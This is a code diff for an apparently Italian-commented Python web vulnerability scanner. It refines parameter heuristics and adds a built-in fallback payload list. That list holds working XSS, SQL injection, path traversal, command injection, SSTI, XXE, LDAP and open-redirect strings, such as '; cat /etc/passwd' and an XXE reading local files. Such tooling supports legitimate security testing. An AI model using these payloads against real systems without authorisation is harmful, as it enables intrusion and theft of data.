@@ -1811,94 +1811,133 @@ class TechnologyDetector:
 
 class ParameterAnalyzer:
     """Analyze parameters for vulnerability indicators"""
-    
+
     def __init__(self):
-        self.sql_params = ['id', 'user_id', 'product_id', 'cat', 'category', 'item', 'page', 
+        # Parametri che suggeriscono query SQL
+        self.sql_params = ['id', 'user_id', 'product_id', 'cat', 'category', 'item',
                           'sort', 'order', 'limit', 'offset', 'search', 'q', 'query']
-        self.file_params = ['file', 'path', 'document', 'folder', 'name', 'page', 'include',
-                           'template', 'view', 'module', 'load']
-        self.cmd_params = ['cmd', 'exec', 'command', 'execute', 'ping', 'system', 'do', 'func']
+        # Parametri che suggeriscono inclusione file - RIMOSSO 'name', 'page' troppo generici
+        self.file_params = ['file', 'path', 'document', 'folder', 'include',
+                           'template', 'view', 'module', 'load', 'dir', 'filepath']
+        # Parametri che suggeriscono esecuzione comandi
+        self.cmd_params = ['cmd', 'exec', 'command', 'execute', 'ping', 'system', 'do', 'func', 'ip']
+        # Parametri che suggeriscono XML
         self.xxe_params = ['xml', 'data', 'input', 'payload', 'doc', 'document']
-        
+        # Parametri che suggeriscono template - RIMOSSO 'name' troppo generico
+        self.ssti_params = ['template', 'render', 'engine', 'tpl']
+
     def analyze_parameter(self, param_name, param_value, response_text, content_type=""):
-        """Analyze a parameter for vulnerability indicators"""
+        """
+        Analyze a parameter for vulnerability indicators.
+
+        PRIORITÀ INTELLIGENTE:
+        1. Se il valore è riflesso nella risposta → XSS ha priorità massima
+        2. Solo se NON c'è reflection, considera altri tipi basati sul nome
+        """
         vulnerabilities = []
         param_name_lower = param_name.lower()
-        
-        # Check for reflection (XSS indicator)
-        if param_value and response_text and str(param_value) in response_text:
-            context = self._get_reflection_context(str(param_value), response_text)
-            if context:
+        param_value_str = str(param_value) if param_value else ""
+
+        # ===== STEP 1: Check for reflection (PRIORITÀ XSS) =====
+        has_reflection = False
+        reflection_context = None
+
+        if param_value_str and response_text and param_value_str in response_text:
+            reflection_context = self._get_reflection_context(param_value_str, response_text)
+            if reflection_context:
+                has_reflection = True
+                # XSS con alta confidenza se c'è reflection in contesto HTML/attributo
+                confidence = 90 if reflection_context in ['html', 'attribute'] else 70
                 vulnerabilities.append({
                     'type': 'xss',
-                    'confidence': 85 if context in ['html', 'attribute'] else 60,
-                    'context': context,
-                    'evidence': 'Parameter value reflected in response'
+                    'confidence': confidence,
+                    'context': reflection_context,
+                    'evidence': f'Parameter value reflected in {reflection_context} context',
+                    'priority': 1  # Massima priorità
                 })
-        
-        # SQL Injection indicators
+
+        # ===== STEP 2: SQL Injection indicators =====
         if param_name_lower in self.sql_params or re.search(r'(id|ID|Id)$', param_name):
             vulnerabilities.append({
                 'type': 'sqli',
-                'confidence': 60,
+                'confidence': 70,
                 'context': 'database_parameter',
-                'evidence': f'Parameter name suggests database query: {param_name}'
+                'evidence': f'Parameter name suggests database query: {param_name}',
+                'priority': 2
             })
-        
-        # File Inclusion indicators
+
+        # ===== STEP 3: File Inclusion - SOLO se il nome è specifico per file =====
         if param_name_lower in self.file_params:
             vulnerabilities.append({
                 'type': 'lfi',
-                'confidence': 60,
+                'confidence': 70,
                 'context': 'file_parameter',
-                'evidence': f'Parameter name suggests file operation: {param_name}'
+                'evidence': f'Parameter name suggests file operation: {param_name}',
+                'priority': 2
             })
-        
-        # Command Injection indicators
+        # 'page' può essere LFI ma con confidenza minore
+        if param_name_lower == 'page' and not has_reflection:
+            vulnerabilities.append({
+                'type': 'lfi',
+                'confidence': 50,
+                'context': 'file_parameter',
+                'evidence': f'Parameter "page" might accept file paths',
+                'priority': 3
+            })
+
+        # ===== STEP 4: Command Injection indicators =====
         if param_name_lower in self.cmd_params:
             vulnerabilities.append({
                 'type': 'rce',
-                'confidence': 60,
+                'confidence': 70,
                 'context': 'command_parameter',
-                'evidence': f'Parameter name suggests command execution: {param_name}'
+                'evidence': f'Parameter name suggests command execution: {param_name}',
+                'priority': 2
             })
-        
-        # XXE indicators
+
+        # ===== STEP 5: XXE indicators =====
         if param_name_lower in self.xxe_params or 'xml' in content_type.lower():
             vulnerabilities.append({
                 'type': 'xxe',
                 'confidence': 60,
                 'context': 'xml_parameter',
-                'evidence': f'Parameter appears to accept XML data: {param_name}'
+                'evidence': f'Parameter appears to accept XML data: {param_name}',
+                'priority': 3
             })
-        
-        # SSTI indicators
-        if param_name_lower in ['template', 'name', 'view', 'page'] and '{{' not in str(param_value):
+
+        # ===== STEP 6: SSTI - SOLO se parametro specifico E NO reflection =====
+        if param_name_lower in self.ssti_params and not has_reflection:
             vulnerabilities.append({
                 'type': 'ssti',
-                'confidence': 35,
+                'confidence': 50,
                 'context': 'template_parameter',
-                'evidence': f'Parameter name suggests template usage: {param_name}'
+                'evidence': f'Parameter name suggests template usage: {param_name}',
+                'priority': 3
             })
-        
-        # Open Redirect indicators
+
+        # ===== STEP 7: Open Redirect indicators =====
         if param_name_lower in ['url', 'link', 'redirect', 'return', 'next', 'callback', 'goto']:
             vulnerabilities.append({
                 'type': 'open_redirect',
                 'confidence': 60,
                 'context': 'redirect_parameter',
-                'evidence': f'Parameter name suggests redirection: {param_name}'
+                'evidence': f'Parameter name suggests redirection: {param_name}',
+                'priority': 3
             })
-        
-        # LDAP Injection indicators
-        if param_name_lower in ['username', 'user', 'name', 'uid', 'cn', 'dn']:
+
+        # ===== STEP 8: LDAP Injection - SOLO per parametri auth specifici =====
+        if param_name_lower in ['username', 'user', 'uid', 'cn', 'dn', 'ldap']:
             vulnerabilities.append({
                 'type': 'ldapi',
-                'confidence': 35,
+                'confidence': 40,
                 'context': 'authentication_parameter',
-                'evidence': f'Parameter used for authentication: {param_name}'
+                'evidence': f'Parameter used for authentication: {param_name}',
+                'priority': 4
             })
-        
+
+        # Ordina per priorità (1 = massima)
+        vulnerabilities.sort(key=lambda x: (x.get('priority', 5), -x.get('confidence', 0)))
+
         return vulnerabilities
     
     def _get_reflection_context(self, value, html):
@@ -1921,14 +1960,129 @@ class ParameterAnalyzer:
 
 class WordlistMapper:
     """Map vulnerabilities to appropriate wordlists"""
-    
+
+    # ========== INTERNAL FALLBACK PAYLOADS ==========
+    # Usati quando i wordlist esterni non sono disponibili
+    INTERNAL_PAYLOADS = {
+        'xss': [
+            # Payload semplici ed efficaci per XSS
+            '<script>alert(1)</script>',
+            '<script>alert("XSS")</script>',
+            '<img src=x onerror=alert(1)>',
+            '<svg onload=alert(1)>',
+            '<body onload=alert(1)>',
+            '"><script>alert(1)</script>',
+            "'-alert(1)-'",
+            '<img src=x onerror="alert(1)">',
+            '<ScRiPt>alert(1)</sCrIpT>',
+            '<IMG SRC="javascript:alert(1);">',
+            '<a href="javascript:alert(1)">click</a>',
+            '"><img src=x onerror=alert(1)>',
+            "' onfocus=alert(1) autofocus='",
+            '<input onfocus=alert(1) autofocus>',
+            '<marquee onstart=alert(1)>',
+            '<video><source onerror=alert(1)>',
+            '<audio src=x onerror=alert(1)>',
+            '<details open ontoggle=alert(1)>',
+            '{{constructor.constructor("alert(1)")()}}',  # Angular
+            '${alert(1)}',  # Template literal
+        ],
+        'sqli': [
+            # SQL Injection payloads
+            "' OR '1'='1",
+            "' OR 1=1--",
+            "' OR 1=1#",
+            "1' OR '1'='1",
+            "admin'--",
+            "1 OR 1=1",
+            "' UNION SELECT NULL--",
+            "' UNION SELECT NULL,NULL--",
+            "1' AND '1'='1",
+            "1' AND SLEEP(5)--",
+            "'; WAITFOR DELAY '0:0:5'--",
+            "1' ORDER BY 1--",
+            "1' ORDER BY 10--",
+            "-1 UNION SELECT 1,2,3--",
+            "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--",
+        ],
+        'lfi': [
+            # LFI payloads
+            '../../../etc/passwd',
+            '../../../../etc/passwd',
+            '../../../../../etc/passwd',
+            '....//....//....//etc/passwd',
+            '/etc/passwd',
+            '..\\..\\..\\..\\windows\\win.ini',
+            '/proc/self/environ',
+            '....//....//....//windows/win.ini',
+            'file:///etc/passwd',
+            'php://filter/convert.base64-encode/resource=/etc/passwd',
+            'php://input',
+            '/var/log/apache2/access.log',
+            '/var/log/nginx/access.log',
+        ],
+        'rce': [
+            # RCE payloads
+            '; id',
+            '| id',
+            '`id`',
+            '$(id)',
+            '; whoami',
+            '| whoami',
+            '& whoami',
+            '; cat /etc/passwd',
+            '| cat /etc/passwd',
+            '; ping -c 3 127.0.0.1',
+            '| ping -c 3 127.0.0.1',
+            '; sleep 5',
+            '| sleep 5',
+            '& dir',
+            '| type c:\\windows\\win.ini',
+        ],
+        'ssti': [
+            # SSTI payloads
+            '{{7*7}}',
+            '${7*7}',
+            '#{7*7}',
+            '<%= 7*7 %>',
+            '{{config}}',
+            '{{self}}',
+            '{{"".__class__}}',
+            "${T(java.lang.Runtime).getRuntime().exec('id')}",
+            "{{_self.env.registerUndefinedFilterCallback('exec')}}",
+            '{{request}}',
+            '${request}',
+        ],
+        'xxe': [
+            # XXE payloads
+            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
+            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>',
+        ],
+        'ldapi': [
+            # LDAP Injection
+            '*',
+            '*)(&',
+            '*)(uid=*))(|(uid=*',
+            'admin*',
+            '*)(objectClass=*',
+        ],
+        'open_redirect': [
+            # Open Redirect
+            '//evil.com',
+            'https://evil.com',
+            '//evil.com/%2f..',
+            '/\\evil.com',
+            '////evil.com',
+        ],
+    }
+
     def __init__(self, base_paths=None):
         self.base_paths = base_paths or {
             'fuzzdb': '/usr/share/wordlists/fuzzdb',
             'payloads': '/usr/share/wordlists/PayloadsAllTheThings',
             'seclists': '/usr/share/wordlists/SecLists'
         }
-        
+
         self.wordlist_map = {
             'xss': {
                 'fuzzdb': [
@@ -2304,12 +2458,12 @@ class WordlistMapper:
     def get_wordlists_for_vulnerability(self, vuln_type, technology=None):
         """Get appropriate wordlists for a vulnerability type"""
         wordlists = []
-        
+
         if vuln_type not in self.wordlist_map:
             return wordlists
-        
+
         vuln_lists = self.wordlist_map[vuln_type]
-        
+
         # Build full paths
         for source, paths in vuln_lists.items():
             if source in self.base_paths:
@@ -2320,8 +2474,16 @@ class WordlistMapper:
                         'path': full_path,
                         'relative_path': path
                     })
-        
+
         return wordlists
+
+    def get_internal_payloads(self, vuln_type):
+        """
+        Get internal fallback payloads for a vulnerability type.
+        Usato quando i wordlist esterni non sono disponibili.
+        """
+        vuln_type_lower = vuln_type.lower()
+        return self.INTERNAL_PAYLOADS.get(vuln_type_lower, [])
 
 
 class DiscoveryWordlistMapper:
@@ -3858,12 +4020,15 @@ class SmartCrawler:
         - Payload validation per skippare payload invalidi
         - Rate limiting integrato
         - Performance monitoring
+        - ⚠️ FALLBACK a payload interni se wordlist esterni non disponibili
         """
         tested_payloads = set()  # Per evitare duplicati
         max_payloads_per_list = 10  # Limit for immediate testing
 
-        # Collect payloads con LAZY LOADING
+        # Collect payloads con LAZY LOADING da file esterni
         all_payloads = []
+        external_loaded = False
+
         for wordlist in wordlists[:3]:  # Limit to first 3 wordlists
             if not os.path.exists(wordlist['path']):
                 continue
@@ -3885,8 +4050,10 @@ class SmartCrawler:
                             if payload_count >= max_payloads_per_list:
                                 break
 
-                if self.verbose and payload_count > 0:
-                    print(f"    📚 Loaded {payload_count} payloads from: {wordlist['source']}/{wordlist['relative_path']}")
+                if payload_count > 0:
+                    external_loaded = True
+                    if self.verbose:
+                        print(f"    📚 Loaded {payload_count} payloads from: {wordlist['source']}/{wordlist['relative_path']}")
 
             except IOError as e:
                 logger.error(f"IO error reading wordlist {wordlist['path']}: {e}")
@@ -3896,11 +4063,24 @@ class SmartCrawler:
                 self.performance_monitor.increment_errors()
                 continue
 
+        # ⚠️ FALLBACK: se nessun wordlist esterno disponibile, usa payload interni
+        if not all_payloads:
+            internal_payloads = self.wordlist_mapper.get_internal_payloads(vuln_type)
+            if internal_payloads:
+                all_payloads = internal_payloads[:max_payloads_per_list * 2]
+                if self.verbose:
+                    print(f"    🔧 Using {len(all_payloads)} INTERNAL fallback payloads for {vuln_type.upper()}")
+            else:
+                if self.verbose:
+                    print(f"    ⚠️ No payloads available for {vuln_type} (external or internal)")
+                return
+
         # Sort and unique (sort | uniq)
         unique_payloads = sorted(list(set(all_payloads)))
 
         if self.verbose:
-            print(f"    📊 Total unique payloads: {len(unique_payloads)} (from {len(all_payloads)} total)")
+            source_type = "external" if external_loaded else "internal"
+            print(f"    📊 Total unique payloads: {len(unique_payloads)} ({source_type})")
 
         # Limita payloads da testare
         payloads_to_test = unique_payloads[:max_payloads_per_list * 2]
